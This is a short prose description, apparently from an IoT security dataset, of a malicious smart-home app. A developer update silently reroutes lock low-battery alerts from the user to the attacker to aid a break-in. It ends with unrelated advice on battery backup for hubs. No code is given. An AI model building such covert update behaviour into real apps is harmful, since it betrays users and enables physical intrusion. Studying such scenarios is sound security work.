 *Attack Description:
    Attacker insert the malicious functions into the user's smartApp by updating his apps.



Malicous PowersOutAlert:
    Normal functions:
    The user installed the legal smartApp powerOutDetector to detect the battery of the locks and windows. If the batteries of locks and windows are low, then it would send sms to the user. If the batteries are recharged, then it would send the sms to tell the user that the devices work normally.

    Malicious functions:
    The attacker could update his smartApp. And the update code would be added to the userâ€™s normal app without the permission of the user. If the battery of the lock runs out, the malicious smartApp would not send message to the user about the low battery. Instead, it sends the message to the attacker so that the attacker could break in easily.

You can connect the hub and internet connection device (e.g. modem, router, etc.) to a battery backup power strip so that the motion detector and detect the loss and the hub and router will still have enough power to get the message out before they fail as well.",
